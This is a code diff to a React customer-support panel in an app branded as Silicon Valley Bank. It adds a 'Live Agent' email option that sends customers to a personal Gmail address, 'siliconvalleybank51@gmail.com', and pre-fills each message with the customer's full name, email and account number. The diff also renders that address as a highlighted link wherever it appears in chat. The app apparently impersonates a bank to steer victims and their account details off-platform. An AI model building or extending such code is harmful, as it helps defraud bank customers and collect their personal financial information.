@@ -688,6 +688,67 @@ export const CustomerSupportPanel: React.FC<CustomerSupportPanelProps> = ({
     }
   };
 
+  const [copiedEmail, setCopiedEmail] = useState(false);
+  const SUPPORT_EMAIL = 'siliconvalleybank51@gmail.com';
+
+  const handleOpenLiveAgentEmail = () => {
+    const subject = encodeURIComponent(`Live Agent Support Inquiry - ${user.fullName} (Acc #${user.accountNumber})`);
+    const body = encodeURIComponent(`Hello Silicon Valley Bank Support Team,\n\nI require assistance with my account.\n\nAccount Holder: ${user.fullName}\nEmail: ${user.email}\nAccount Number: ${user.accountNumber}\n\nInquiry Details:\n`);
+    window.location.href = `mailto:${SUPPORT_EMAIL}?subject=${subject}&body=${body}`;
+  };
+
+  const handleCopyEmail = (e?: React.MouseEvent) => {
+    if (e) e.stopPropagation();
+    navigator.clipboard.writeText(SUPPORT_EMAIL);
+    setCopiedEmail(true);
+    setTimeout(() => setCopiedEmail(false), 2500);
+  };
+
+  const renderMessageContent = (text: string) => {
+    const containsTargetEmail = text.includes(SUPPORT_EMAIL);
+
+    if (containsTargetEmail) {
+      const parts = text.split(SUPPORT_EMAIL);
+      return (
+        <div className="space-y-2.5">
+          <p className="whitespace-pre-wrap leading-relaxed break-words font-medium">
+            {parts[0]}
+            <a
+              href={`mailto:${SUPPORT_EMAIL}?subject=Live%20Agent%20Support%20Inquiry%20-%20${encodeURIComponent(user.fullName)}`}
+              className="text-amber-400 hover:text-amber-300 font-bold underline decoration-amber-400/50 inline-flex items-center gap-1 mx-1 transition-colors"
+            >
+              <Mail className="w-3.5 h-3.5 inline" />
+              {SUPPORT_EMAIL}
+            </a>
+            {parts.slice(1).join(SUPPORT_EMAIL)}
+          </p>
+
+          <div className="pt-1.5 flex flex-wrap items-center gap-2">
+            <button
+              type="button"
+              onClick={handleOpenLiveAgentEmail}
+              className="px-3 py-1.5 bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-slate-950 font-bold rounded-xl text-[11px] shadow-sm flex items-center gap-1.5 transition-all cursor-pointer"
+            >
+              <Mail className="w-3.5 h-3.5" />
+              <span>Message Live Agent (Email)</span>
+            </button>
+            <button
+              type="button"
+              onClick={handleCopyEmail}
+              className="px-2.5 py-1.5 bg-slate-900 hover:bg-slate-800 text-slate-300 rounded-xl text-[11px] border border-slate-700 flex items-center gap-1 transition-colors cursor-pointer"
+              title="Copy email address"
+            >
+              {copiedEmail ? <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" /> : <Mail className="w-3.5 h-3.5 text-slate-400" />}
+              <span>{copiedEmail ? 'Copied' : 'Copy Email'}</span>
+            </button>
+          </div>
+        </div>
+      );
+    }
+
+    return <p className="whitespace-pre-wrap leading-relaxed break-words font-medium">{text}</p>;
+  };
+
   return (
     <div className="max-w-6xl mx-auto space-y-5">
       {/* Top Banner Header */}
@@ -714,7 +775,7 @@ export const CustomerSupportPanel: React.FC<CustomerSupportPanelProps> = ({
             <p className="text-xs text-slate-400 mt-0.5">
               {isAdmin 
                 ? 'Real-time two-way messaging, search registered emails/accounts, and permanent Firestore history.' 
-                : 'Direct 1-on-1 private messaging with your dedicated SVB Concierge Officer.'}
+                : 'Choose between direct Live Agent email support or SVB Live in-app messaging.'}
             </p>
           </div>
         </div>
@@ -742,6 +803,75 @@ export const CustomerSupportPanel: React.FC<CustomerSupportPanelProps> = ({
           </button>
         </div>
       </div>
+
+      {/* Dual Support Choice Banner for Non-Admin Clients */}
+      {!isAdmin && (
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+          {/* OPTION 1: LIVE AGENT (Direct Email Client) */}
+          <div 
+            onClick={handleOpenLiveAgentEmail}
+            className="group bg-gradient-to-r from-amber-950/40 via-slate-900 to-slate-900 border border-amber-500/40 hover:border-amber-400 rounded-3xl p-4 shadow-lg cursor-pointer transition-all hover:shadow-amber-500/10 flex flex-col justify-between space-y-3"
+          >
+            <div className="flex items-center justify-between">
+              <div className="flex items-center gap-3">
+                <div className="w-10 h-10 rounded-2xl bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-amber-400 group-hover:scale-105 transition-transform">
+                  <Mail className="w-5 h-5" />
+                </div>
+                <div>
+                  <div className="flex items-center gap-2">
+                    <h3 className="text-sm font-bold text-white">Live Agent Support</h3>
+                    <span className="bg-amber-500/20 text-amber-300 text-[10px] font-extrabold px-2 py-0.5 rounded-full border border-amber-500/30">
+                      Priority Email
+                    </span>
+                  </div>
+                  <p className="text-xs text-slate-400">Directly message support from your email inbox</p>
+                </div>
+              </div>
+            </div>
+
+            <div className="pt-2 border-t border-slate-800/80 flex items-center justify-between text-xs">
+              <div className="flex items-center gap-1.5 font-mono text-amber-300">
+                <Mail className="w-3.5 h-3.5" />
+                <span>{SUPPORT_EMAIL}</span>
+              </div>
+              <div className="flex items-center gap-2">
+                <button
+                  type="button"
+                  onClick={handleCopyEmail}
+                  className="px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg text-[11px] border border-slate-700 flex items-center gap-1 transition-colors"
+                >
+                  {copiedEmail ? <CheckCircle2 className="w-3 h-3 text-emerald-400" /> : <Mail className="w-3 h-3" />}
+                  <span>{copiedEmail ? 'Copied' : 'Copy'}</span>
+                </button>
+                <span className="text-amber-400 font-bold group-hover:translate-x-1 transition-transform">Open &rarr;</span>
+              </div>
+            </div>
+          </div>
+
+          {/* OPTION 2: SVB LIVE (In-App Messaging) */}
+          <div className="bg-gradient-to-r from-emerald-950/40 via-slate-900 to-slate-900 border border-emerald-500/40 rounded-3xl p-4 shadow-lg flex flex-col justify-between space-y-3">
+            <div className="flex items-center justify-between">
+              <div className="flex items-center gap-3">
+                <div className="w-10 h-10 rounded-2xl bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-400">
+                  <MessageSquare className="w-5 h-5" />
+                </div>
+                <div>
+                  <div className="flex items-center gap-2">
+                    <h3 className="text-sm font-bold text-white">SVB Live Chat</h3>
+                    <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
+                  </div>
+                  <p className="text-xs text-slate-400">In-app interactive live support workspace</p>
+                </div>
+              </div>
+            </div>
+
+            <div className="pt-2 border-t border-slate-800/80 flex items-center justify-between text-xs text-slate-400">
+              <span>Syncing live with SVB Concierge Desk</span>
+              <span className="text-emerald-400 font-bold">Active Below</span>
+            </div>
+          </div>
+        </div>
+      )}
 
       {/* Admin Email Search & Registered User Match Quick Bar */}
       {isAdmin && matchingRegisteredUsers.length > 0 && searchFilter.trim() && (
@@ -1116,9 +1246,7 @@ export const CustomerSupportPanel: React.FC<CustomerSupportPanelProps> = ({
                             ? 'bg-emerald-600/30 border border-emerald-500/40 rounded-tr-none text-slate-100' 
                             : 'bg-slate-950 border border-slate-800 rounded-tl-none text-slate-100'
                         }`}>
-                          {msgText && (
-                            <p className="whitespace-pre-wrap leading-relaxed break-words font-medium">{msgText}</p>
-                          )}
+                          {msgText && renderMessageContent(msgText)}
 
                           {/* Render attached images */}
                           {m.images && m.images.length > 0 && (
